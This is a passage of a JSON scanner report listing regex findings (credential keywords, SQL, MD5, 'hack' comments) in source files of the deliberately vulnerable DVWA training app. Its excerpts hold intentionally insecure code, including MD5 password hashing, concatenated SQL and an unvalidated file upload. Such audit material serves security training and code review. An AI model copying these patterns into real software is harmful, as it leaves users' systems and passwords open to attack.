        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 68,
        "startLocationColumn": 33,
        "endLocationLine": 68,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/medium.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Password",
        "excerpt": "\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n\telse {\n\t\t// Issue with the passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t\t$hide_form = false;\n",
        "startLocationLine": 72,
        "startLocationColumn": 18,
        "endLocationLine": 72,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/medium.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Passwords",
        "excerpt": "\t}\n\telse {\n\t\t// Issue with the passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t\t$hide_form = false;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n",
        "startLocationLine": 76,
        "startLocationColumn": 18,
        "endLocationLine": 76,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/medium.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 68,
        "startLocationColumn": 33,
        "endLocationLine": 68,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/medium.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Password",
        "excerpt": "\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n\telse {\n\t\t// Issue with the passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t\t$hide_form = false;\n",
        "startLocationLine": 72,
        "startLocationColumn": 18,
        "endLocationLine": 72,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/medium.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 68,
        "startLocationColumn": 13,
        "endLocationLine": 68,
        "endLocationColumn": 100
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/medium.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "private_key",
        "excerpt": "\n\t// Check CAPTCHA from 3rd party\n\t$resp = recaptcha_check_answer(\n\t\t$_DVWA[ &#39;recaptcha_private_key&#39; ],\n\t\t$_POST[&#39;g-recaptcha-response&#39;]\n\t);\n\n\t// Did the CAPTCHA fail?\n\tif( !$resp ) {\n",
        "startLocationLine": 13,
        "startLocationColumn": 22,
        "endLocationLine": 13,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/medium.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\tif( $pass_new == $pass_conf ) {\n\t\t// They do!\n\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 65,
        "startLocationColumn": 15,
        "endLocationLine": 65,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/low.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "passwords",
        "excerpt": "\t\t}\n\t\telse {\n\t\t\t// Both new passwords do not match.\n\t\t\t$html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;\n\t\t\t$hide_form = false;\n\t\t}\n\t}\n}\n\n",
        "startLocationLine": 39,
        "startLocationColumn": 28,
        "endLocationLine": 39,
        "endLocationColumn": 37
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/low.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "password",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 60,
        "startLocationColumn": 33,
        "endLocationLine": 60,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/low.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Password",
        "excerpt": "\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n\telse {\n\t\t// Issue with the passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t\t$hide_form = false;\n",
        "startLocationLine": 64,
        "startLocationColumn": 18,
        "endLocationLine": 64,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/low.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Passwords",
        "excerpt": "\t}\n\telse {\n\t\t// Issue with the passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t\t$hide_form = false;\n\t}\n\n\t((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);\n}\n",
        "startLocationLine": 68,
        "startLocationColumn": 18,
        "endLocationLine": 68,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/low.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "password",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 60,
        "startLocationColumn": 33,
        "endLocationLine": 60,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/low.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(auth_token|access_token|password|passwrd|client_credentials|client_*id|client_*secret)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "Password",
        "excerpt": "\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n\telse {\n\t\t// Issue with the passwords matching\n\t\t$html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;\n\t\t$hide_form = false;\n",
        "startLocationLine": 64,
        "startLocationColumn": 18,
        "endLocationLine": 64,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/low.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;",
        "excerpt": "\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n\t\t// Feedback for the end user\n\t\t$html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;\n\t}\n",
        "startLocationLine": 60,
        "startLocationColumn": 13,
        "endLocationLine": 60,
        "endLocationColumn": 100
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/low.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "private_key",
        "excerpt": "\n\t// Check CAPTCHA from 3rd party\n\t$resp = recaptcha_check_answer(\n\t\t$_DVWA[ &#39;recaptcha_private_key&#39;],\n\t\t$_POST[&#39;g-recaptcha-response&#39;]\n\t);\n\n\t// Did the CAPTCHA fail?\n\tif( !$resp ) {\n",
        "startLocationLine": 13,
        "startLocationColumn": 22,
        "endLocationLine": 13,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\tif( $pass_new == $pass_conf ) {\n\t\t// They do!\n\t\t$pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\t\t$pass_new = md5( $pass_new );\n\n\t\t// Update database\n\t\t$insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;\n\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );\n\n",
        "startLocationLine": 57,
        "startLocationColumn": 15,
        "endLocationLine": 57,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/high.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\nif( isset( $_POST[ &#39;Upload&#39; ] ) ) {\n\t// Where are we going to be writing to?\n\t$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;\n\t$target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );\n\n\t// File information\n\t$uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];\n\t$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1);\n",
        "startLocationLine": 5,
        "startLocationColumn": 43,
        "endLocationLine": 5,
        "endLocationColumn": 47
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/impossible.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\t$uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];\n\n\t// Where are we going to be writing to?\n\t$target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;;\n\t//$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;;\n\t$target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;\n\t$temp_file     = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) );\n\t$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;\n\n",
        "startLocationLine": 16,
        "startLocationColumn": 44,
        "endLocationLine": 16,
        "endLocationColumn": 48
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t// Where are we going to be writing to?\n\t$target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;;\n\t//$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;;\n\t$target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;\n\t$temp_file     = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) );\n\t$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;\n\n\t// Is it an image?\n\tif( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp;\n",
        "startLocationLine": 18,
        "startLocationColumn": 20,
        "endLocationLine": 18,
        "endLocationColumn": 23
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/impossible.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t//$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;;\n\t$target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;\n\t$temp_file     = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) );\n\t$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;\n\n\t// Is it an image?\n\tif( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp;\n\t\t( $uploaded_size &lt; 100000 ) &amp;&amp;\n\t\t( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp;\n",
        "startLocationLine": 20,
        "startLocationColumn": 41,
        "endLocationLine": 20,
        "endLocationColumn": 44
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/medium.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\nif( isset( $_POST[ &#39;Upload&#39; ] ) ) {\n\t// Where are we going to be writing to?\n\t$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;\n\t$target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );\n\n\t// File information\n\t$uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];\n\t$uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ];\n",
        "startLocationLine": 5,
        "startLocationColumn": 43,
        "endLocationLine": 5,
        "endLocationColumn": 47
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/source/low.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\nif( isset( $_POST[ &#39;Upload&#39; ] ) ) {\n\t// Where are we going to be writing to?\n\t$target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;\n\t$target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );\n\n\t// Can we move the file to the upload folder?\n\tif( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) {\n\t\t// No\n",
        "startLocationLine": 5,
        "startLocationColumn": 43,
        "endLocationLine": 5,
        "endLocationColumn": 47
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/help/help.php",
        "ruleId": "AI026500",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "(include|require) .*",
        "type": "Regex",
        "confidence": "High",
